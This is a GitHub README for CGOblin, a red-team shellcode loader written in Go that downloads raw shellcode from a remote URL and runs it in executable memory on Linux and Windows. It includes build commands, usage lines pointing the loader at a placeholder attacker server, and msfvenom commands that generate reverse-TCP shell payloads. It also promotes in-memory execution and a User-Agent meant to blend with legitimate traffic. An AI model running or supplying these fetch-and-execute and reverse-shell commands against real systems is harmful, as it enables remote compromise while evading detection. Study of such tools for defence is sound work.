# 🧌 CGOblin – Cross-Platform Shellcode Loader

<img width="1024" height="1024" alt="cgoblin" src="https://github.com/user-attachments/assets/900668cf-cb18-4ef2-bab5-20aadcf01a36" />

**cgoblin** is a lightweight, cross-platform shellcode loader written in Go, capable of fetching and executing shellcode from a remote URL on both **Linux** and **Windows** systems. It leverages inline C via CGO to allocate executable memory and run position-independent machine code.

> 🔒 *For educational and red teaming purposes only.*

<img width="689" height="887" alt="image" src="https://github.com/user-attachments/assets/541df9f7-914b-4a89-b5e3-695c3d004a7c" />


---

## 📦 Repository

- **URL**: [https://github.com/grisuno/cgoblin.git](https://github.com/grisuno/cgoblin.git)
- **Author**: [grisuno](https://github.com/grisuno)
- **Team**: LazyOwn RedTeam

---

## 🚀 Features

- ✅ Cross-platform support (Linux & Windows)
- ✅ Remote shellcode loading via HTTP(S)
- ✅ Shellcode parsing from `\xNN` hex format
- ✅ Memory allocation with execution permissions:
  - Uses `mmap()` on Linux
  - Uses `VirtualAlloc()` on Windows
- ✅ Minimal footprint and no disk staging (in memory only)
- ✅ Custom User-Agent and secure HTTP client settings

---
<img width="1515" height="541" alt="image" src="https://github.com/user-attachments/assets/f2852e22-0121-4c3c-96c6-58774579c703" />

## Prerequisites
**CGOblin** requires a multi-language development environment supporting both Go and Python, with CGO compilation capabilities for system-level memory operations.

### Core Requirements
Component	Version	Purpose
- Go	1.24.2+	Core application runtime and compilation
- Python	3.x	Launcher script and development utilities [OPTIONAL]
- CGO	Enabled	System call interface for memory operations
- GCC/Clang	Latest	C compiler for CGO compilation

## 🛠️ Usage

<img width="691" height="869" alt="image" src="https://github.com/user-attachments/assets/8cb716c2-8193-4ab3-99b0-dc4de0b5479c" />


### Build

<img width="857" height="442" alt="image" src="https://github.com/user-attachments/assets/c9297511-7fe5-4708-aef7-adbb0eefa739" />


```bash
# Linux
GOOS=linux go build -o loader_linux main.go loader_linux.go
```

```bash
# Windows
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -o loader_windows.exe
```

<img width="654" height="851" alt="image" src="https://github.com/user-attachments/assets/88f85131-f90f-4197-a64a-9b8ad619043f" />

💡 Ensure CGO is enabled: CGO_ENABLED=1 (default when supported). 

```bash
# Linux
# Example
./loader_linux -url http://your-server.com/shellcode.txt
```

<img width="1632" height="780" alt="image" src="https://github.com/user-attachments/assets/20f636d1-1eaf-4cf1-bbbb-0be9cb821e6c" />


```bash
# Windows
# Example
powershell .\loader_windows.exe -url http://your-server.com/shellcode.txt
```

<img width="1058" height="630" alt="image" src="https://github.com/user-attachments/assets/a5f04378-bdd6-417e-941c-fd6217afd123" />

```bash
# shellcode
# Example
unsigned char buf[] = "\x6a\x29\x58\x99\x...";
```

⚠️ The loader parses only sequences matching \x.. and ignores everything else. 

<img width="331" height="873" alt="image" src="https://github.com/user-attachments/assets/9c92957f-c060-47f5-865f-a01c8e5a767b" /> <img width="358" height="815" alt="image" src="https://github.com/user-attachments/assets/af8fc684-ccc7-47b8-a0d5-ebec36decb79" />

```bash
# shellcode 
# Example Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt 
```
```bash
# shellcode 
# Example Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt
```

```text
# Tree
# Example
.
├── go.mod               # Go module definition
├── main.go              # Entry point with CLI flag parsing
├── loader_linux.go      # Linux-specific execution logic (CGO + mmap)
├── loader_windows.go    # Windows-specific execution logic (CGO + VirtualAlloc)
├── shellcode_linux.txt  # Example Linux shellcode (bind/reverse shell)
└── shellcode_win.txt    # Example Windows shellcode (e.g., Calc or Cmd)
```

📝 Example shellcode files are provided for testing (non-malicious use recommended). 

## 🧪 Testing Safely
- To test without risk:

- Host a simple shellcode (e.g., execve("/bin/sh") on Linux or WinExec("calc.exe") on Windows).
- Use local HTTP server:

```bash
# Webserver
# Example
python3 -m http.server 8000
```

## Security and Operational Considerations
### cgoblin implements several security-conscious design patterns:

- Memory-only operations: No temporary files are created during shellcode processing
- Custom HTTP headers: Configurable User-Agent strings to blend with legitimate traffic
- Input validation: Shellcode size limits and format verification
- Platform isolation: Platform-specific code paths prevent cross-contamination
- CGO safety: Proper memory management in C interface layers

## External Framework Integration
### Relevant source files
Purpose and Scope This document covers how **CGOblin** integrates with external exploitation frameworks and automation systems. The integration system allows external tools to automatically configure, build, and execute the shellcode loader with dynamically generated payloads. This capability enables **CGOblin** to function as a component within larger penetration testing suites and automated exploitation frameworks.

For information about the core shellcode loading functionality, see Core Shellcode Loader System. For details about the build system that supports framework integration, see Build System.

### Framework Integration Architecture
The external framework integration system uses a YAML-based configuration approach that defines how external tools can interact with **CGOblin**. The integration supports parameter-driven payload generation and automated execution workflows.

## 🛑 Disclaimer
This tool is intended for:

- Security research
- Red team operations
- Authorized penetration testing
- Do not use for unauthorized access or malicious purposes. The author and team assume no liability for misuse.

## Compliance Framework
Users of cgoblin must ensure compliance with:

- Local Computer Crime Laws: Unauthorized access laws vary by jurisdiction
- Professional Ethics: Penetration testing codes of conduct
- Contractual Obligations: Scope limitations in security assessments
- Data Protection Regulations: Privacy laws when handling target systems


## 🤝 Team: LazyOwn RedTeam
A dedicated red team focused on offensive security, exploit development, and defensive evasion techniques.

"We break it to make it better — ethically." 

## 📄 License
This project is open-source for educational use. See LICENSE for details (**GPLv3**).


# Links
-    [+] **gomulti_loader** the little brother of **CGOblin**: [https://github.com/grisuno/gomulti_loader](https://github.com/grisuno/gomulti_loader)
-    [+] Shorts: [https://www.youtube.com/shorts/kPZvVV_RNIE](https://www.youtube.com/shorts/kPZvVV_RNIE)
-    [+] Deepwiki: [https://deepwiki.com/grisuno/cgoblin](https://deepwiki.com/grisuno/cgoblin)
-    [+] Github: [https://github.com/grisuno/LazyOwn](https://github.com/grisuno/LazyOwn)
-    [+] Web: [https://grisuno.github.io/LazyOwn/](https://grisuno.github.io/LazyOwn/)
-    [+] Reddit: [https://www.reddit.com/r/LazyOwn/](https://www.reddit.com/r/LazyOwn/)
-    [+] Facebook: [https://web.facebook.com/profile.php?id=61560596232150](https://web.facebook.com/profile.php?id=61560596232150)
-    [+] HackTheBox: [https://app.hackthebox.com/teams/overview/6429 ](https://app.hackthebox.com/teams/overview/6429 )
-    [+] Grisun0: [https://app.hackthebox.com/users/1998024](https://app.hackthebox.com/users/1998024)
-    [+] Patreon: [https://patreon.com/LazyOwn ](https://patreon.com/LazyOwn )
-    [↙] Download: [https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.47.tar.gz ](https://github.com/grisuno/LazyOwn/archive/refs/tags/release/0.2.47.tar.gz )

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
